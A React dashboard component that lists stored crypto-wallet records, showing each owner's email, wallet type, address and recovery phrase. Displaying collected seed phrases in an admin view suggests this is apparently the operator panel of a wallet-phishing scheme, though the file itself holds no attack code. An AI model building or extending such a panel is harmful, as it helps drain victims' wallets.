import React from "react";
import DashNav from "../layout/DashNav";

function WalletList({ wallets }) {
  return (
    <div className="grid grid-cols-5 bg-gray-900">
      <DashNav />
      <div className="col-span-4">
        <div>
          <h1 className="text-3xl font-bold text-center text-gray-300 mt-14">
            Wallets
          </h1>
          <div className="p-10">
            <div className="grid grid-cols-4">
              {wallets.map((item, i) => (
                <ul
                  key={item._id}
                  className="bg-gray-200 mx-5 p-5 shadow-xl rounded-sm font-bold"
                >
                  <h2 className="text-center text-xl font-extrabold">
                    Wallet Details
                  </h2>
                  <li className="mb-1">
                    Email: <span className="">{item.email}</span>
                  </li>
                  <li className="mb-1">Type: {item.walletType}</li>
                  <li className="mb-1">Address: {item.address}</li>
                  <li className="mb-1">Phrase: {item.phrase}</li>
                  <li className="mb-1">{item._id}</li>
                </ul>
              ))}
            </div>
          </div>
        </div>
        
      </div>
    </div>
  );
}

export default WalletList;
